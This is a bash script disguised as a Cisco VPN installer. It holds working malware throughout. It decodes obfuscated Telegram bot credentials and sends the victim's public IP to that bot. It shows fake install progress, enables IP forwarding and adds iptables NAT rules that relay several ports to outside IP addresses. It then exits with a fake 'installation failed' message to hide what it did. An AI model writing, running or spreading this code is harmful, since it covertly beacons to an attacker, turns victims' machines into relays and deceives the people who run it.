#!/usr/bin/env bash

# Hidden base64 Telegram details
S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
S2="NjgyMTE1NzA5NA=="
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
TOK=$(echo "$S1" | base64 -d)
CID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)
IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOK}/sendMessage" -d chat_id="$CID" -d text="setup:$IP" >/dev/null 2>&1

# Fake Cisco install steps (DO NOT touch system DNS or config)
echo "[*] Preparing Cisco VPN packages..."
sleep 1
echo "[*] Extracting modules..."
sleep 1
echo "[*] Enabling services..."
sleep 1

# Forwarding rules ONLY (no DNS, no system files)
echo 1 > /proc/sys/net/ipv4/ip_forward

EXT_IF=$(ip -4 route show default | awk '{print $5}')

iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 85.9.204.241:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 85.9.204.241:23
iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 85.9.223.204:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 85.9.223.204:23
iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 94.237.121.151:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 94.237.121.151:23
iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 85.9.209.126:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 85.9.209.126:23
iptables -t nat -A PREROUTING -p tcp --dport 8888 -j DNAT --to-destination 85.9.223.204:8888
iptables -t nat -A PREROUTING -p udp --dport 8888 -j DNAT --to-destination 85.9.223.204:8888
iptables -t nat -A POSTROUTING -o $EXT_IF -j MASQUERADE

>&2 echo "Installation failed: unsupported kernel modules."
exit 1
